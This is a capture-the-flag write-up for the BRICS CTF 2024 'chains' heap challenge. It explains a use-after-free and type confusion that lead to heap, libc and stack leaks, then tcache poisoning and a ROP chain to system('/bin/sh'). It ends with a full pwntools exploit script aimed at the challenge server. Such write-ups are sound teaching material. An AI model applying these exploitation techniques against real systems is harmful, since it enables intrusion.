+++
title = 'chains - BRICS CTF 2024'
date = 2024-10-18T18:50:53+02:00
draft = false
+++

two weeks ago, I played BRICS CTF with r3kapig, and we ranked 1st!
chains was one of the challanges I solved.

we were given a program to add/remove proxies and chains. upon executing we're presented with:
```
1. Add Proxy
2. Delete Proxy
3. Add Chain
4. View Chain
5. Delete Chain
6. Exit
```
that resembles a typical heap challenge. it turns out to be one,
since the following structures are getting allocated dynamically:
```c
typedef struct _proxy {
    char* hostname;
    int16_t port;
} proxy_t;

typedef struct _chain {
    proxy_t* proxy;
    struct _chain* next;
} chain_t;
```
allocating user input is restricted to the `hostname` buffer, which is limited in size (128 bytes).
an interesting functionality is, that we can attach proxies to a `chain_t` of length `n`.
this stores a reference to a `proxy_t` object into the `proxy` member.

here comes the problem. we can free proxies individually, however their references from chains
are not cleared. freeing a chain would also try to free the associated proxies, so we can
achieve a use-after-free. this works vice-versa

to leak heap, we can free a proxy object via the `delete_chain` function, and due to it's reference not being cleared in `proxies` array, we can add the free'd proxy to a chain again. this allows us
to receive a heap leak:
```py
add_proxy(b"AAAA", 1234)
add_proxy(b"BBBB", 1234)
add_proxy(b"CCCC", 1234)

add_chain(1, [1])
delete_chain(0) # 1 is deleted

add_chain(2, [1, 2])
add_chain(2, [1, 2])

view_chain(1) # leak
```
now how do we continue from here? we have a modern libc version (`2.39-0ubuntu8.3`) plus we cannot
fully control chunks in terms of size and data. that's why I constructed an arbitrary free / read.

for that I used some sort of type confusion. if we overlap a free'd `chain_t` with `proxy_t`, our
data in `hostname` gets interpreted as a `proxy_t` object, and our `port` as `next` pointer.
we can fully craft a fake and controlled `proxy_t` object now.
when doing a view or delete our the already free `chain_t` pointer, it tries to ouput or free
the `hostname` property of our fake object, so we can control the location entirely!

to get a libc leak then, I crafted a fake unsorted chunk, free'd it using the arb free to then read
the libc address of `main_arena`:
```py
add_proxy(b"DDDD", 1234) # 3
add_proxy(b"EEEE", 1234) # 4

add_chain(1, [3])
delete_chain(2)

add_chain(1, [4])
add_chain(1, [4]) # 3

delete_proxy(3)
add_proxy(p64(unsorted_ptr)+p64(0x0)*0x3+p64(0x0)+p64(0x421)+b"ZZZZZZZZ", 0) # overwrite pointers

for i in range(4):
    add_proxy(b"XXXX", 1234)

add_proxy(b"A"*0x20+p64(0x0)+p64(0x61), 1234)
add_proxy(b"XXXX", 1234)

delete_chain(3)

delete_proxy(1) # free chain 0
add_proxy(p64(unsorted_ptr), 0) # overwrite pointers

view_chain(0)
```

because the libc version is new, I decided to overwrite return address on the stack. luckily we
can re-use our arb read technique we used for libc leak to get a stack leak from `environ`.

to write to the stack, I just overlapped some tcache chunks and did some tcache poisioning.
all that was left to do is to rop to `system("/bin/sh")`:
```py
from pwn import *

def add_proxy(hostname, port):
    p.sendlineafter(b">", b"1")
    p.sendlineafter(b"hostname:", hostname)
    p.sendlineafter(b"port:", str(port).encode("ascii"))

def delete_proxy(id):
    p.sendlineafter(b">", b"2")
    p.sendlineafter(b"id:", str(id).encode("ascii"))

def add_chain(sz, ids):
    assert sz == len(ids)
    p.sendlineafter(b">", b"3")
    p.sendlineafter(b"size:", str(sz).encode("ascii"))
    for id in ids:
        p.sendlineafter(b"id:", str(id).encode("ascii"))

def view_chain(id):
    p.sendlineafter(b">", b"4")
    p.sendlineafter(b"id:", str(id).encode("ascii"))

def delete_chain(id):
    p.sendlineafter(b">", b"5")
    p.sendlineafter(b"id:", str(id).encode("ascii"))

def mask(heap_base,target):
      return (heap_base >> 0xc ) ^ target

#p = process("./chains")
p = remote("89.169.156.185", 13905)

add_proxy(b"AAAA", 1234)
add_proxy(b"BBBB", 1234)
add_proxy(b"CCCC", 1234)

add_chain(1, [1])
delete_chain(0) # 1 is deleted

add_chain(2, [1, 2])
add_chain(2, [1, 2])

view_chain(1)
p.recvuntil(b" is ")
heap_leak = u64(p.recv(6).ljust(8, b"\x00"))
secret_addr = heap_leak - 0x18
unsorted_ptr = heap_leak + 0x120
overlap_ptr = heap_leak + 0xaf0
mask_ptr = heap_leak + 0xb40
log.info("heap_leak: " + hex(heap_leak))

"""
proxy chunk 1 is read
proxy chunk 3 is free
"""

delete_proxy(1) # free chain 0
add_proxy(p64(secret_addr), 0) # overwrite pointers

view_chain(0)
p.recvuntil(b"proxy #1 is ")
secret = u64(p.recv(8))
log.info("heap secret: " + hex(secret))

add_proxy(b"DDDD", 1234) # 3
add_proxy(b"EEEE", 1234) # 4

add_chain(1, [3])
delete_chain(2)

add_chain(1, [4])
add_chain(1, [4]) # 3

delete_proxy(3)
add_proxy(p64(unsorted_ptr)+p64(0x0)*0x3+p64(0x0)+p64(0x421)+b"ZZZZZZZZ", 0) # overwrite pointers

for i in range(4):
    add_proxy(b"XXXX", 1234)

add_proxy(b"A"*0x20+p64(0x0)+p64(0x61), 1234)
add_proxy(b"XXXX", 1234)

delete_chain(3)

delete_proxy(1) # free chain 0
add_proxy(p64(unsorted_ptr), 0) # overwrite pointers

view_chain(0)
p.recvuntil(b"proxy #1 is ")
libc_leak = u64(p.recv(6).ljust(8, b"\x00"))
libc_base = libc_leak - 0x203b20
system = libc_base + 0x58740
binsh = libc_base + 0x1cb42f
environ = libc_base + 0x20ad58
pop_rdi = libc_base + 0x10f75b
ret = libc_base + 0x2882f
log.info("libc_base: " + hex(libc_base))

delete_proxy(1) # free chain 0
add_proxy(p64(environ), 0) # overwrite pointers
view_chain(0)
p.recvuntil(b"proxy #1 is ")
stack_leak = u64(p.recv(6).ljust(8, b"\x00"))
rip = stack_leak - 0x138
log.info("stack_leak: " + hex(stack_leak))

for i in range(10):
    add_proxy(b"XXXX", 1234)

add_proxy(b"DDDD", 1234) # 21
add_proxy(b"EEEE", 1234) # 22

add_chain(1, [21]) # 3
delete_chain(3)

add_chain(1, [22])
add_chain(1, [22]) # 4

delete_proxy(21)
add_proxy(p64(overlap_ptr), 0x0) # overwrite pointers

add_proxy(b"XXXX", 1234)
add_proxy(b"X"*0x50 + p64(0x0) + p64(0x91), 1234)
add_proxy(b"X"*0x30 + p64(0x0) + p64(0x51), 1234)
add_proxy(b"XXXX", 1234)

delete_proxy(26)
delete_proxy(25)

delete_chain(4)

add_proxy(b"A"*0x70, 1234)
add_proxy(b"A"*0x50 + p64(mask(mask_ptr, rip)), 1234)
add_proxy(b"A"*0x70, 1234)
add_proxy(b"A"*0x8 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system), 1234)

p.sendlineafter(b">", b"6")

p.interactive()
```